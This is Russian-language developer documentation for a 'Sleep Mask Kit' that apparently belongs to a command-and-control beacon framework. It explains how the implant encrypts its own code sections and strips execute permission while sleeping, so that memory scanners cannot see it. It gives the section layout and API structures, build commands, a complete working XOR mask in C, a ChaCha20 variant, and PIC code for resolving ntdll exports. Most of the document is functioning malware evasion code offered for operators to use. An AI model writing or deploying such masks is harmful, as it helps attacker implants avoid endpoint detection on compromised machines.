Sleep Mask Kit

Sleep Mask Kit позволяет заменить встроенную логику сна beacon'а на пользовательский PIC-шелкод. Во время сна beacon шифрует свои исполняемые секции, меняет их защиту на RW и выполняет задержку. Это делает beacon невидимым для сканеров памяти.

Архитектура

Beacon PE имеет специальные секции для обфускации сна:

СекцияСодержимоеШифруется во сне?
.textКод beacon'а (tasking, команды, крипто)Да
.rdataКонстанты, таблицы импортаДа
.sleepТрамплин (masked_sleep, разрешение NT-функций)Нет
.slpmskСлот для пользовательского шелкода (8192 байта)Нет
.co2cfgBeaconState (конфигурация)Нет

Поток выполнения

beacon_run()
  +-- masked_sleep(ms)                     [.sleep section]
       |-- find_self_base()                VirtualQuery -> module base
       |-- Walk PE sections -> regions[]   (only .text, .rdata)
       |-- bc_random(key, 16)              generate XOR key
       |-- Resolve NtProtectVirtualMemory, NtDelayExecution, etc.
       |-- IF .slpmsk patched:
       |       [4-byte EP offset] -> call user mask blob
       |   ELSE:
       |       call default_mask() (built-in XOR + NtDelayExecution)
       +-- Zero key, return

Формат блоба (.slpmsk)

Блоб — это извлечённая .text секция скомпилированной маски с 4-байтным заголовком:

[uint32_t LE: смещение от начала блоба до entry point]
[... весь код .text секции ...]

Поскольку линкер использует /MERGE:.rdata=.text, все данные (строки, таблицы) сливаются в .text перед кодом. Entry point обычно не на нулевом смещении — заголовок указывает точное смещение.

Максимальный размер блоба: 8176 байт (8192 - 16 байт сентинела). Если скомпилированная маска превышает этот размер, artifact-gen откажет в патчинге.

API (SleepMaskCtx)

Трамплин заполняет структуру SleepMaskCtx и передаёт указатель на неё в маску. Определение в kit/sleepmask/sleep_mask_api.h:

SleepRegion

typedef struct SleepRegion {
    void*    base;           // виртуальный адрес региона
    uint32_t size;           // размер в байтах
    uint32_t original_prot;  // исходная защита PAGE_*
} SleepRegion;

SleepMaskCtx

typedef struct SleepMaskCtx {
    // ---- Регионы для шифрования ----
    SleepRegion regions[16];   // .text, .rdata (заполнены трамплином)
    uint32_t    region_count;  // количество заполненных элементов

    // ---- Крипто-материал ----
    uint8_t     key[16];       // случайный 16-байтный ключ (новый каждый цикл)

    // ---- Параметры сна ----
    uint32_t    sleep_ms;      // задержка в миллисекундах
    uint8_t     jitter_pct;    // процент дрожания (0-99)
    uint8_t     _pad[3];

    // ---- Указатели на NT-функции (из ntdll.dll) ----
    NTSTATUS (*NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS (*NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER Delay);
    NTSTATUS (*NtWaitForSingleObject)(HANDLE, BOOL, PLARGE_INTEGER);

    // ---- Kernel32 ----
    BOOL (*FlushInstructionCache)(HANDLE hProcess, const void*, SIZE_T);

    // ---- Вспомогательное ----
    HANDLE  process_handle;    // псевдо-хендл (HANDLE)-1
    void*   ntdll_base;        // база ntdll.dll (для резолва доп. функций)
} SleepMaskCtx;

Контракт маски

Пользовательский код обязан выполнить следующую последовательность:

  1. Изменить защиту на RW — NtProtectVirtualMemory(..., PAGE_READWRITE, ...) для каждого региона. Убирает Execute — сканер не увидит исполняемого beacon-кода.
  2. Зашифровать регионы — XOR, ChaCha20, AES или любой симметричный алгоритм. Ключ: ctx->key[16] (или производный от него).
  3. Выполнить задержку — NtDelayExecution, NtWaitForSingleObject, timer-queue APC или иной механизм ожидания.
  4. Расшифровать регионы — та же операция в обратном порядке.
  5. Восстановить защиту — вернуть original_prot для каждого региона.
  6. FlushInstructionCache — сбросить кеш инструкций.
ЗАПРЕЩЕНО вызывать любые функции beacon'а — его .text секция зашифрована во время выполнения маски! Все необходимые функции должны быть резолвнуты через ctx->ntdll_base или получены из ctx.

Правила PIC-кода

  • Никаких глобальных переменных и статических данных.
  • Никаких строковых литералов ("NtCreateEvent") — только массивы на стеке.
  • Никакого CRT (malloc, printf, memcpy и т.д.).
  • Entry point sleep_mask_entry должна быть первой определённой функцией в файле.
  • Все вспомогательные функции определяются после entry point.
  • Соглашение вызова: __cdecl.
  • Максимальный размер скомпилированного кода: 8176 байт.

Сборка

Автоматическая (build_all.bat)

cd kit\sleepmask
build_all.bat

Скрипт компилирует все маски из masks\ + default_mask.c для x64 и x86. Результат: bin\<name>.x64.bin и bin\<name>.x86.bin.

Ручная сборка одной маски

REM x64:
cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /I"kit\sleepmask" ^
    /Fo"mask.obj" my_mask.c
link.exe /nologo /NODEFAULTLIB /ENTRY:sleep_mask_entry ^
    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
    /OUT:mask.exe mask.obj
python kit\sleepmask\extract_section.py mask.exe .text mask.x64.bin

REM x86 (добавить /arch:IA32 и линковать x86_helpers.obj):
cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /arch:IA32 /I"kit\sleepmask" ^
    /Fo"mask.obj" my_mask.c
cl.exe /nologo /c /O2 /GS- /Zl /TC /Fo"helpers.obj" ^
    kit\sleepmask\x86_helpers.c
link.exe /nologo /NODEFAULTLIB /ENTRY:sleep_mask_entry ^
    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
    /OUT:mask.exe mask.obj helpers.obj
python kit\sleepmask\extract_section.py mask.exe .text mask.x86.bin

Как написать свою маску

Шаблон

#include "sleep_mask_api.h"

// Вспомогательные функции (forward declaration).
static int   pic_strcmp(const char* a, const char* b);
static void* pic_get_proc(void* module_base, const char* func_name);

// ---- ENTRY POINT (должна быть ПЕРВОЙ функцией в файле) ----
void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T sz;
    PVOID base;
    ULONG old_prot;

    // 1. Защита -> RW
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz, 0x04, &old_prot);
    }

    // 2. Шифрование
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 3. Задержка
    {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
        ctx->NtDelayExecution(FALSE, &delay);
    }

    // 4. Расшифровка (XOR симметричен)
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 5. Восстановление защиты
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz,
            (ULONG)ctx->regions[i].original_prot, &old_prot);
    }

    // 6. Flush
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
}

// ---- Вспомогательные функции (ПОСЛЕ entry point) ----
// ...

Резолв дополнительных NT-функций

Если нужны функции, не включённые в SleepMaskCtx (например, NtCreateEvent, NtClose), их можно получить через парсинг export directory ntdll по адресу ctx->ntdll_base:

// Строки на стеке (PIC!) -- НЕ литералы!
char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};

// Резолв через pic_get_proc (парсинг PE export table)
typedef NTSTATUS (__stdcall *pfn_NtCreateEvent)(HANDLE*, DWORD, void*, int, BOOL);
pfn_NtCreateEvent NtCreateEvent =
    (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);

Реализация pic_get_proc

Стандартная реализация, используемая во всех масках кита:

static int pic_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static void* pic_get_proc(void* module_base, const char* func_name) {
    unsigned char* base = (unsigned char*)module_base;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* exp_dir =
        &nt->OptionalHeader.DataDirectory[0]; // IMAGE_DIRECTORY_ENTRY_EXPORT
    if (!exp_dir->VirtualAddress) return 0;
    IMAGE_EXPORT_DIRECTORY* exp =
        (IMAGE_EXPORT_DIRECTORY*)(base + exp_dir->VirtualAddress);
    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        if (pic_strcmp((const char*)(base + names[i]), func_name) == 0)
            return (void*)(base + funcs[ordinals[i]]);
    }
    return 0;
}

Подводные камни x86

На x64 код изначально позиционно-независим (RIP-relative addressing). На x86 MSVC генерирует абсолютные адреса, что ломает PIC-шелкод. Три основные проблемы:

1. Строковые литералы

На x86 строка "NtCreateEvent" помещается в .rdata, а ссылка на неё — push 0x004010xx (абсолютный адрес). При загрузке шелкода по другому адресу этот указатель невалиден.

Решение: все строки объявлять как массивы символов на стеке:

// НЕПРАВИЛЬНО (x86 сломается):
void* p = pic_get_proc(base, "NtCreateEvent");

// ПРАВИЛЬНО (PIC на любой архитектуре):
char s[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
void* p = pic_get_proc(base, s);

2. SSE-инструкции с абсолютными адресами

MSVC по умолчанию использует SSE2 для инициализации массивов на стеке: movaps xmm0, [0x00401000] — загрузка 16-байтного шаблона из .rdata по абсолютному адресу.

Решение: компилировать x86-маски с флагом /arch:IA32, который полностью запрещает SSE-инструкции. Все операции выполняются через x87/ALU.

3. 64-битное умножение (__allmul)

Выражение -(LONGLONG)sleep_ms * 10000LL на x86 генерирует вызов __allmul — внутренней функции CRT для 64-битного умножения. Эта функция должна быть доступна в момент вызова.

Для PIC-блобов: при линковке подключается x86_helpers.obj (содержит __allmul, __allshr, __aullshr). Код попадает в .text блоба и работает корректно.

Для встроенной маски beacon'а: __allmul находится в .text секции beacon'а. Если маска зашифровала .text до вычисления задержки — вызов __allmul приведёт к краху. Поэтому все 64-битные операции выполняются ДО шифрования.

// ПРАВИЛЬНО: вычислить delay ДО шифрования
LARGE_INTEGER delay;
delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;  // вызывает __allmul

// ... затем шифруем ...
xor_encrypt(regions);

// ... спим с уже вычисленным значением ...
ctx->NtDelayExecution(FALSE, &delay);

Пример: минимальная маска

Файл default_mask.c — простейшая рабочая маска (XOR-16 + NtDelayExecution):

#include "sleep_mask_api.h"

void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T sz;
    PVOID base;
    ULONG old_prot;

    // 1. RW
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz, 0x04, &old_prot);
    }

    // 2. XOR encrypt
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 3. Sleep
    {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
        ctx->NtDelayExecution(FALSE, &delay);
    }

    // 4. XOR decrypt
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 5. Restore
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz,
            (ULONG)ctx->regions[i].original_prot, &old_prot);
    }

    // 6. Flush
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
}

Пример: ChaCha20 + NtWaitForSingleObject

Файл masks/chacha_sleep/mask.c демонстрирует:

  • Использование полноценного потокового шифра (256-bit key из 16-байтного seed)
  • Резолв дополнительных функций из ntdll через pic_get_proc
  • Ожидание через unsignaled event (чистый стек при сканировании)
  • Зануление крипто-материала после использования
void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    // Key derivation: 16 -> 32 bytes key + 12 bytes nonce
    uint8_t key32[32];
    uint8_t nonce12[12];
    for (int k = 0; k < 16; ++k) {
        key32[k] = ctx->key[k];
        key32[16+k] = ctx->key[k] ^ 0xA5;
    }
    for (int k = 0; k < 12; ++k) nonce12[k] = ctx->key[k + 4];

    // Строки на стеке (PIC!)
    char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
    char s_nc[]  = {'N','t','C','l','o','s','e',0};

    // Резолв доп. функций из ntdll
    pfn_NtCreateEvent NtCreateEvent =
        (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);
    pfn_NtClose NtClose =
        (pfn_NtClose)pic_get_proc(ctx->ntdll_base, s_nc);

    // Создание unsignaled event
    HANDLE hEvent = 0;
    int use_event = 0;
    if (NtCreateEvent && NtClose) {
        if (NtCreateEvent(&hEvent, 0x1F0003, 0, 1, FALSE) >= 0)
            use_event = 1;
    }

    // 1. RW
    // 2. ChaCha20 encrypt
    // 3. NtWaitForSingleObject (timeout = sleep_ms)
    // 4. ChaCha20 decrypt (same key + counter=0)
    // 5. Restore protection
    // 6. FlushInstructionCache + NtClose(hEvent)

    // Zero crypto material
    for (int k = 0; k < 32; ++k) key32[k] = 0;
    for (int k = 0; k < 12; ++k) nonce12[k] = 0;
}
Полный исходный код ChaCha20 (встроенный в шелкод) см. в kit/sleepmask/masks/chacha_sleep/mask.c. Реализация самодостаточна — не зависит от внешних библиотек.

Интеграция с beacon'ом

Как beacon вызывает маску

  1. Функция masked_sleep(ms) в секции .sleep вызывается из главного цикла beacon'а.
  2. Трамплин определяет базу модуля через VirtualQuery.
  3. Обходит PE section table, отбирая .text и .rdata (пропускает .sleep, .slpmsk, .co2cfg).
  4. Генерирует случайный 16-байтный ключ (bc_random).
  5. Резолвит NT-функции из ntdll (строки на стеке, без .rdata-паттернов).
  6. Проверяет секцию .slpmsk:
    • Если содержит сентинел CO2H_SLPMASK_v1 — маска не вшита, вызывает встроенную default_mask().
    • Если сентинел перезаписан — читает 4-байтное смещение до EP, прыгает на g_slpmsk_slot + offset.
  7. После возврата маски — зануляет ключ, возвращает управление beacon'у.

Сентинел-детектирование

Проверка сентинела выполняется побайтово (без обращения к .rdata), чтобы исключить ложный паттерн при /MERGE:.rdata=.text:

if (g_slpmsk_slot[0]  != 'C')  return 1; // patched
if (g_slpmsk_slot[1]  != 'O')  return 1;
...
if (g_slpmsk_slot[15] != '\0') return 1;
return 0;  // unpatched

Диаграмма секций в памяти

+------------------+
| .text            |  <-- шифруется маской
| .rdata           |  <-- шифруется маской
+------------------+
| .sleep           |  <-- НЕ шифруется (трамплин + default_mask)
+------------------+
| .slpmsk          |  <-- НЕ шифруется (пользовательский PIC-блоб)
+------------------+
| .co2cfg          |  <-- НЕ шифруется (BeaconState)
+------------------+
| .data, .bss      |  <-- НЕ шифруются (глобальные переменные)
+------------------+
